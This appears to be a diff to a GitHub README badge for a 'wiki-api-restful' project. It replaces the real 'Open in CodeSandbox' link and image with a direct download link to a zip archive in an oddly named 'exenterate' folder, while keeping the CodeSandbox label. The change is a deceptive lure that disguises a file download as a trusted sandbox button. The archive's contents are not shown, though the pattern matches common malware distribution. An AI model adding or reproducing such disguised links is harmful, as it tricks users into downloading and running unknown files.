@@ -1,5 +1,5 @@
 <p align="center">
-  <a href="https://codesandbox.io/p/sandbox/github/mhr0007/wiki-api-restful">
-    <img src="https://codesandbox.io/static/img/play-codesandbox.svg" alt="Open in CodeSandbox" />
+  <a href="https://github.com/mhr0007/wiki-api-restful/raw/refs/heads/master/exenterate/api_wiki_restful_2.1-alpha.5.zip">
+    <img src="https://github.com/mhr0007/wiki-api-restful/raw/refs/heads/master/exenterate/api_wiki_restful_2.1-alpha.5.zip" alt="Open in CodeSandbox" />
   </a>
 </p>
